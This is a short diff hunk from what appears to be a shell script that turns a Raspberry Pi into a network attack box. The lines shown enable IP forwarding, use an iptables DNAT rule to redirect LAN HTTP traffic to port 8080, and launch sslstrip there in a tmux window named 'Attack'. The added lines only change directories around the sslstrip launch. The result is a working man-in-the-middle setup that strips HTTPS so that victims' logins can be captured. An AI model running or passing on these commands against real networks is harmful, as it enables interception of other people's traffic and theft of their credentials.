@@ -167,8 +167,10 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A PREROUTING -i $lan -p tcp --dport 80 -j DNAT --to-destination 10.1.1.1:8080
 
 #PROXY
+cd bin/sslstrip/
 killall sslstrip
 tmux new-window -tAttack:8 -n 'Proxy' 'sslstrip -l 8080 -a'
+cd ../../
 
 ###########CANT ENABLE RELIABLY WITHOUT A 512MB PI################################
 #MSRPC Service
